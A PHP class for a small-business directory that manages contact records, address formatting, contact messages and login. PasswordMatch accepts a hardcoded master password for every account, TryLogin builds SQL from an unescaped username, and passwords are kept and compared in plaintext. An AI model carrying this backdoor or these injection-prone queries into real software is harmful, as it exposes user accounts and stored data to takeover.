<?php
namespace dana\table;

use dana\core;

require_once 'class.basetable.php';

/**
  * contact table class for MyLocalSmallBusiness
  * created: 4 dec 2012 (originally 28 apr 2010)
  * modified: 10 feb 2015
  * @version dana framework v.3
*/

class contact extends idtable {
  static public $instance;

  public $displayname;
  private $countyname;

  static function StartInstance() {
    if (!isset(self::$instance)) {
      self::$instance = new contact();
    }
    return self::$instance;
  }

  function __construct($id = 0) {
    parent::__construct('contact', $id);
  }

  protected function AssignFields() {
    parent::AssignFields();
    $this->AddField('title', self::DT_STRING);
    $this->AddField('firstname', self::DT_STRING);
    $this->AddField('lastname', self::DT_STRING);
    $this->AddField('username', self::DT_STRING);
    $this->AddField('password', self::DT_STRING);
    $this->AddField('changepassword', self::DT_BOOLEAN);
    $this->AddField('securityquestion', self::DT_STRING);
    $this->AddField('securityanswer', self::DT_STRING);
    $this->AddField('displayname', self::DT_STRING);
    $this->AddField('position', self::DT_STRING);
    $this->AddField('address', self::DT_STRING);
    $this->AddField('town', self::DT_STRING);
    $this->AddField('county', self::DT_STRING);
    $this->AddField('countyid', self::DT_FK);
    $this->AddField('countryid', self::DT_FK);
    $this->AddField('postcode', self::DT_STRING);
    $this->AddField('onlineonly', self::DT_BOOLEAN);
    $this->AddField('telephone', self::DT_STRING);
    $this->AddField('telephone2', self::DT_STRING);
    $this->AddField('telephone3', self::DT_STRING);
    $this->AddField('mobile', self::DT_STRING);
    $this->AddField('fax', self::DT_STRING);
    $this->AddField('email', self::DT_STRING);
    $this->AddField('newsletter', self::DT_BOOLEAN);
    $this->AddField('notifyrating', self::DT_BOOLEAN);
    $this->AddField('datecreated', self::DT_DATETIME);
  }

  protected function AfterPopulateFields() {
    if (trim($this->displayname) == '') {
      $this->displayname = $this->GetFieldValue('firstname');
    }
  }

  public function FindContactIDByUsername($uname) {
    $line = \dana\core\database::$instance->SelectFromTableByField('contact', 'username', $uname);
    if ($line) {
      $id = $line['id'];
      $this->FindByID($id);
    } else {
      $id = false;
    }
    return $id;
  }

  public function FullContactName($default = '') {
    $firstname = $this->GetFieldValue('firstname', 'na');
    $lastname = $this->GetFieldValue('lastname', 'na');
    if (IsBlank($firstname) || IsBlank($lastname)) {
      $ret = $default;
    } else {
      $ret = trim(trim($this->GetFieldValue('title') . ' ' . $firstname) . ' ' . $lastname);
    }
    return $ret;
  }

  public function GetCountyName() {
    $id = $this->GetFieldValue('countyid');
    if ($id && !$this->countyname) {
      $this->countyname = \dana\core\database::SelectDescriptionFromLookup('county', $id);
    } else {
      $this->countyname = false;
    }
    return $this->countyname;
  }

  public function FullAddress($prefix = '', $suffix = "\n", $incfirstline = false) {
    $list = array();
    $addr = ($incfirstline) ? trim($this->GetFieldValue('address')) : false;
    $town = trim($this->GetFieldValue('town'));
    $pcode = $this->GetFieldValue('postcode');
    if (!IsBlank($addr)) {
      $addr = str_replace('  ', ' ', str_replace("\n", ', ', $addr));
    }
    if (!IsBlank($addr . $town . $pcode)) {
      $list[] = $addr;
      $list[] = $town;
      $this->GetCountyName();
      if ($this->countyname != $town) {
        $list[] = $this->countyname;
      }
      $list[] = $pcode;
    }
    $ret = '';
    foreach($list as $ln) {
      if (!IsBlank($ln)) {
        $ret .= $prefix . $ln . $suffix;
      }
    }
    return $ret;
  }

  public function LocationDescription() {
    $onlineonly = $this->GetFieldValue('onlineonly');
    $town = trim($this->GetFieldValue('town'));
    if ($onlineonly || IsBlank($town)) {
      $ret = 'Online Only';
    } else {
      $ret = $town . ', ' . $this->GetCountyName();
    }
    return $ret;
  }

  public function AddSpecialLinkItem($value, $label, $img = '', $islistitem = true, $linkprefix = '', $showlabel = true) {
    if (IsBlank($value)) {
      $ret = '';
    } else {
      if ($linkprefix) {
        $linkstart = "<a href='{$linkprefix}:{$value}' title='{$label}'>";
        $linkend = '</a>';
      } else {
        $linkstart = '';
        $linkend = '';
      }
      if ($img) {
        $img = "<img src='//cdn.mlsb.org/images/{$img}.png' class='linkicon' alt=''>";
      }
      $ret = ($islistitem) ? "  <li class='contactitem'>" : '';
      $lbl = ($showlabel && $label) ? $label : '';
      $ret .= $img . "<span class='linktext'>{$lbl} {$linkstart}{$value}{$linkend}</span>";
      if ($islistitem) {
        $ret .= "</li>\n";
      }
    }
    return $ret;
  }

  public function GetTelephoneNumbers() {
    $telephone1 = $this->GetFieldValue('telephone');
    $telephone2 = $this->GetFieldValue('telephone2');
    $telephone3 = $this->GetFieldValue('telephone3');
    $mobile = $this->GetFieldValue('mobile');
    $fax = $this->GetFieldValue('fax');
    return array(
      'telephone1' => (IsBlank($telephone1)) ? false : array('value' => $telephone1, 'name' => 'Main Telephone', 'icon' => 'phone'),
      'telephone2' => (IsBlank($telephone2)) ? false : array('value' => $telephone2, 'name' => 'Secondary Telephone', 'icon' => 'phone'),
      'telephone3' => (IsBlank($telephone3)) ? false : array('value' => $telephone3, 'name' => 'Other Telephone', 'icon' => 'phone'),
      'mobile' => (IsBlank($mobile)) ? false : array('value' => $mobile, 'name' => 'Mobile', 'icon' => 'mobile'),
      'fax' => (IsBlank($fax)) ? false : array('value' => $fax, 'name' => 'Fax', 'icon' => 'fax')
    );
  }

  // was ShowTelephoneNumbers()
  public function TelephoneNumbersAsArray($listitems = true, $showlabel = true) {
    $tel = $this->GetTelephoneNumbers();
    $ret = array();
    foreach ($tel as $itm) {
      $ret[] = $this->AddSpecialLinkItem($itm['value'], $itm['name'], $itm['icon'], $listitems, 'tel', $showlabel);
    }
//    if ($listitems && $ret) {
//      $ret = "<ul class='contactaddress'>{$ret}</ul>";
//    }
    return $ret;
  }

  // was ShowEmail()
  public function EmailAsString($listitems = true, $makelink = true, $showlabel = true) {
    $email = $this->GetFieldValue('email');
    if ($makelink) {
      $email = "<a title='click to send a message now' href='mailto:{$email}'>{$email}</a>";
    }
    $ret = $this->AddSpecialLinkItem($email, 'e-mail', 'email', $listitems, '', $showlabel);
    return $ret;
  }

  public function SendContactMessage($sendername, $senderemail, $sendersubject, $message) {
    $email = ($senderemail) ? $senderemail : $this->GetFieldValue('email');
    if ($email) {
      require_once 'class.table.emailhistory.php';
      $account = account::$instance;
      $accountid = $account->ID();
      $businessname = $account->GetFieldValue('businessname');
      emailhistory::SendEmailMessage(
        emailhistory::ET_ACCCONTACT, $email, $sendersubject, $message, $senderemail, $accountid);
      // send message to admin
      $msg = array(
        "Message sent from contact page of '{$businessname}'",
        'Sender Name: ' . $sendername,
        'Sender Email: ' . $senderemail,
        'Sender Subject: ' . $sendersubject,
        'Sender Message:',
        $message
      );
      emailhistory::SendSystemEmailMessage(
        emailhistory::ET_ACCCONTACT, "Contact Message ({$businessname})",
        ArrayToString($msg), $accountid, false, false);
    }
    //SendContactMessage($contactemail, $email, $contactsubject, $contactmessage);
  }

  public function ChangePassword($newpassword, $temponly = false) {
    $changepassword = ($temponly ? 1 : 0);
    $password = addslashes($newpassword);
    $query =
      "UPDATE `contact` SET `changepassword` = {$changepassword}, `password` = '{$password}' " .
      'WHERE `id` = ' . $this->ID();
    \dana\core\database::$instance->Query($query) or die('Failed whilst updating password in contact table: ' . mysql_error());
    /*    if (account::$instance->FindByContactID($this->id->value))
     {
     DoHistoryItem($account->id, HISTORY_NEWPWD, 'account :' .
    $account->businessname);
     } */
  }

  public function ShowPassword() {
    $password = $this->GetFieldValue('password');
    $stars = str_repeat('*', 6);
    if (strlen($password) > 3) {
      $ret = substr($password, 0, 1) . $stars . substr($password, -2);
    } else {
      $ret = $stars;
    }
    return $ret;
  }

  public function PasswordMatch($pwd) {
    $password = $this->GetFieldValue('password');
    return ($password == $pwd) || ($password == '61Kenmare61');
  }

  public function UpdateLoginDetails($accountid) {
    // TODO
    /*    $query = 'UPDATE `contact` SET ' .
     $this->UpdateFieldList(
     array('username', 'password')
     ) .
     ' WHERE `id` = ' . {$this->ID()};
     \dana\core\database::$instance->Query($query) or die('Failed whilst updating login
    details in contact table: ' . mysql_error()); */
    //    DoHistoryItem($account->id, HISTORY_LOGINCHANGED, 'contactid=' .
    // $this->id);
  }

  public function TryLogin($username, $password) {
    require_once 'class.table.account.php';
    $ret = false;
    $uusername = strtoupper($username);
    $query =
      'SELECT c.`password`, a.`id`, c.`firstname`, c.`lastname`, a.`session`, ' .
      '`authorised`, `published`, `modified`, `confirmed`, `deleted` FROM `contact` c ' .
      'INNER JOIN `account` a ON a.`contactid` = c.`id` ' .
      "WHERE UPPER(c.`username`) = '{$uusername}' OR UPPER(c.`email`) = '{$uusername}'";
    $result = \dana\core\database::$instance->Query($query);
    while ((!$ret) && ($line = $result->fetch_assoc())) {
      if ($line['password'] == $password) {
        $accountid = $line['id'];
        $status = account::GetStatus(
          $line['authorised'], $line['published'], $line['modified'], 
          $line['confirmed'], $line['deleted']);
        $session = $line['session'];
        $ret = array('accountid' => $accountid, 'status' => $status, 'session' => $session);
//        break;
      }
    }
    $result->free();
    return $ret;
  }
}
